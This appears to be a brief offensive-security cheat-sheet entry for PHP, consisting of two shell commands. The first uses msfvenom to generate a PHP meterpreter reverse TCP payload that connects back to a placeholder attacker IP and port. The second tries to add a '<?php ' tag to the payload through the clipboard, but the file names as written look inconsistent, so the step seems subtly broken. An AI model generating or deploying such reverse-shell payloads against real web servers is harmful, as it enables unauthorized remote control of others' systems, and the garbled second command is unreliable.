# PHP

```
$ msfvenom -p php/meterpreter_reverse_tcp lhost=<IP> lport=<PORT> -f raw > met.php

$ xclip -selection clipboard met.php && echo '<?php ' | tr -d '\n'> shell.php && xclip -selection clipboard -o >> met.php
```